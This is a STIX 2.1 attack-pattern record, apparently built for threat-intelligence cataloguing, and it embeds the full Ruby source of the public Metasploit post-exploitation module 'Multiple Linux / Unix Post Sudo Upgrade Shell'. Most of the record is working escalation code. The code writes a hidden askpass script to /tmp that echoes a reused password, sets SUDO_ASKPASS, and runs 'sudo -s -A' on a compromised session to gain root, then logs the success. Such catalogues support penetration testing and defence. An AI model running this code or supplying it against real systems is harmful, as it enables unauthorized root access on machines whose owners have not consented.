{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c6f3566-1031-4ed7-bc75-e50d28faa62c",
    "created": "2024-08-14T16:33:17.999439Z",
    "modified": "2024-08-14T16:33:17.999443Z",
    "name": "Multiple Linux / Unix Post Sudo Upgrade Shell",
    "description": " This module attempts to upgrade a shell account to UID 0 by reusing the given password and passing it to sudo. This technique relies on sudo versions from 2008 and later which support -A.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/sudo.rb",
            "external_id": "sudo.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multiple Linux / Unix Post Sudo Upgrade Shell',\n        'Description' => %q{\n          This module attempts to upgrade a shell account to UID 0 by reusing the\n          given password and passing it to sudo. This technique relies on sudo\n          versions from 2008 and later which support -A.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'todb <todb[at]metasploit.com>',\n          'Ryan Baxendale <rbaxendale[at]gmail.com>' # added password option\n        ],\n        'Platform' => %w[aix linux osx solaris unix],\n        'References' => [\n          # Askpass first added March 2, 2008, looks like\n          [ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']\n        ],\n        'SessionTypes' => [ 'shell' ]\n      )\n    ) # Need to test 'meterpreter'\n\n    register_options(\n      [\n        OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    if session.type == 'meterpreter'\n      fail_with(Failure::BadConfig, 'Meterpreter sessions cannot be elevated with sudo')\n    end\n\n    print_status('SUDO: Attempting to upgrade to UID 0 via sudo')\n    sudo_bin = cmd_exec('which sudo')\n    if is_root?\n      print_status 'Already root, so no need to upgrade permissions. Aborting.'\n      return\n    end\n    if sudo_bin.empty?\n      print_error 'No sudo binary available. Aborting.'\n      return\n    end\n    get_root\n  end\n\n  def get_root\n    password = datastore['PASSWORD'] || session.exploit_datastore['PASSWORD']\n\n    if password.to_s.empty?\n      print_status 'No password available, trying a passwordless sudo.'\n    else\n      print_status \"Sudoing with password `#{password}'.\"\n    end\n    askpass_sudo(password)\n    if is_root?\n      print_good 'SUDO: Root shell secured.'\n      report_note(\n        host: session,\n        type: 'host.escalation',\n        data: \"User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell\"\n      )\n    else\n      print_error \"SUDO: Didn't work out, still a mere user.\"\n    end\n  end\n\n  # TODO: test on more platforms\n  def askpass_sudo(password)\n    if password.to_s.empty?\n      begin\n        ::Timeout.timeout(30) do\n          cmd_exec('sudo -s')\n        end\n      rescue ::Timeout::Error\n        print_error 'SUDO: Passwordless sudo timed out. Might be blocking.'\n      rescue StandardError\n        print_error 'SUDO: Passwordless sudo failed. Check the session log.'\n      end\n    else\n      askpass_sh = '/tmp/.' + Rex::Text.rand_text_alpha(7)\n      begin\n        # Telnet can be pretty pokey, allow about 20 seconds per cmd_exec\n        # Generally will be much snappier over ssh.\n        # Need to timeout in case there's a blocking prompt after all\n        ::Timeout.timeout(120) do\n          # Create the shell script that will pass the password to sudo\n          vprint_status \"Writing the SUDO_ASKPASS script: #{askpass_sh}\"\n          write_file(askpass_sh, \"#!/bin/sh\\necho '#{password}'\\n\")\n          register_file_for_cleanup(askpass_sh)\n          vprint_status 'Setting executable bit.'\n          cmd_exec(\"chmod +x #{askpass_sh}\")\n          vprint_status 'Setting environment variable.'\n\n          # Bruteforce the set command. At least one should work.\n          cmd_exec(\"setenv SUDO_ASKPASS #{askpass_sh}\")\n          cmd_exec(\"export SUDO_ASKPASS=#{askpass_sh}\")\n          vprint_status 'Executing sudo -s -A'\n          cmd_exec('sudo -s -A')\n        end\n      rescue ::Timeout::Error\n        print_error 'SUDO: Sudo with a password timed out.'\n      rescue StandardError\n        print_error 'SUDO: Sudo with a password failed. Check the session log.'\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[aix linux osx solaris unix]"
    ]
}